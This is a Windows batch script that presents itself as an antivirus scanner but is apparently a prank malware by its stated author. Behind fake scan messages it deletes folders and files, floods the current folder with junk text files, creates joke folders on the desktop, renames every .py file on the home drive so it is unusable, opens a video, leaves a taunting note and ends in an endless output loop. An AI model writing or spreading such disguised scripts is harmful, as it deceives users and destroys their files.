
@echo off
ECHO ::::::::::::::::::::::::::::::::::::::::::::::::
ECHO ::::::::::::::: ANTITITVIRUS HEBOH :::::::::::::::
ECHO :::::::::::::: CREATED BY ABIISCHOL :::::::::::::::::
ECHO :::::::::::  ANTIVIRUS PROGRAM FOR WINDOWS ::::::::::::
ECHO ::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo Today is %DATE%
echo The time is %TIME%
 :start
set NL=^^^%NLM%%NLM%^%NLM%%NLM%
set /p file= do you wanna check for viruses? click enter for yes, close cmd for no %NL%
@echo off
echo %random%%random%%C:\Program Files (x86)\Kaspersky Lab\Kaspersky 21.8\avpui.exe
echo Loading...
ping localhost -n 30 >nul
@echo off
type scanning...
set waitTime=60000
set /a endTime=%time:~0,2%*3600000 + %time:~3,2%*60000 + %time:~6,2%*1000 + %time:~9,2% + %waitTime%
@echo off
setlocal EnableDelayedExpansion

set /A driveNum=1
for /F "tokens=2 delims==" %%d in ('wmic logicaldisk get caption /value') do (
    set "drive=%%d"
    if defined drive (
        echo Scanning !drive! ...
        dir !drive! /s /a /b /o:gn > "drive!driveNum!.txt"
        set /A driveNum+=1
    )
)

echo All hard drives scanned.

ping localhost -n 5 >nul
@echo off
set "scanResults=scan_results.txt"
echo Scanning files...
for %%f in (*) do (
  echo Processing %%f...
  findstr /i "virus malware" "%%f" >NUL && echo %%f is infected >>%scanResults%
)

echo Scanning complete. Results saved to %scanResults%.
ping localhost -n 5 >nul
@echo off
echo found virus: %namaVirus%
ping localhost -n 5 >nul
echo Alert! Virus has been detected!
echo Alert! Virus has been detected!
ping localhost -n 5 >nul
type menghapuskan virus...
@echo off
rmdir /s /q .\dist
rmdir /s /q .\build
rmdir /s /q .\__pycache__
del "pyinstaller.exe"
del "scan_results.txt"
del "drive1.txt"
del "drive2.txt"
del "drive3.txt"
ping localhost -n 5 >nul
echo Alert! Virus cannot be deleted, you have been infected with malware!
echo the virus has deleted the scan results!
echo Your computer is infected!
@echo off
ipconfig | findstr IPv4
ping localhost -n 5 >nul
dir /s
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
COLOR 0a
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
color f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
echo kena prank> %random%%random%.txt
cls
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
color f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%random%.txt
COLOR 4c
echo kena prank> %random%%random%.txt
COLOR f7
echo kena prank> %random%%randon%.txt
COLOR 08
ping localhost -n 5 >nul
echo quarantining virus...
ping localhost -n 10 >nul
echo virus quarantine failed!!
@echo off
setlocal enabledelayedexpansion

set drop=OOOOHHHHH wow "i am a walrus" "damn daniel" "360 noscope" "oh baby a triple" "shrek" "airhorn.wav" "REKT" "Crazy Frog - Axel F (Official Video)"
set /a ww=1

for %%i in (%drop%) do (
    set "folder=%%i"
    mkdir "%userprofile%\Desktop\!folder!"
    set /a ww+=1
)
@echo off
FOR /R "%homedrive%\" %%X in (*.py) DO (
    REM echo %%X >> %homedrive%\Original.txt SafeMode
    rename "%%X" "%%~nX.f" >NUL 2>&1
)
@echo off
start "" "https://www.youtube.com/watch?v=2UuXld2s6g0&t=72s&autoplay=1"
@echo off
echo Im so lucky lucky, im so lucky lucky, im so lovely lovely, im so lovely lovely, you can fool yourself, i promise it will help, now every single day i just wanna hear you say.. good luck getting your .py files back - ABIISCHOL 2023> message.txt
start /max notepad /A message.txt
echo SELAMAT!!!! ANDA KENA PRANK
ping localhost -n 5 >nul
@echo off
COLOR 0a
:crash
echo %random%  %random% %random% %random% %random% %random%
goto crash
